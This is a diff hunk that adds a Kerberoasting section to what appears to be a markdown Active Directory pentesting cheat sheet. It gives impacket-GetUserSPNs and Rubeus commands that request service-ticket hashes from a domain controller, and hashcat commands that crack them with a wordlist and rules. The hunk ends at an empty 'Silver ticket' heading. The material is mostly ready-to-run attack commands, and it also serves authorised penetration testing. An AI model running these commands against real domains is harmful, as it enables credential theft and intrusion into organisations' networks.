@@ -105,4 +105,24 @@ Import-Module c:\path\to\powerview.ps1
 Get-DomainUser -PreauthNotRequired
 ```
 
+### Kerberoasting
 
+#### With Impacket-GetUserSPNs
+
+Impacket-GetUserSPNs on GitHub: https://github.com/fortra/impacket/blob/master/examples/GetUserSPNs.py
+```
+$ impacket-GetUserSPNs -request -dc-ip $TargetDomainControlerIp organisation.com/someuser
+$ hashcat --help | grep -i kerberos
+$ hashcat -m 13100 spn_hash_to_hack.txt /usr/share/wordlist/rockyou.txt -r myrulefile.rule --force
+```
+
+#### With Rubeus
+
+```
+PS c:\path\to\rubeus> .\Rubeus.exe kerberoast /outfile:spn_hash_to_hack.txt
+```
+and crack it with `hashcat`
+
+### Silver ticket
+
+```
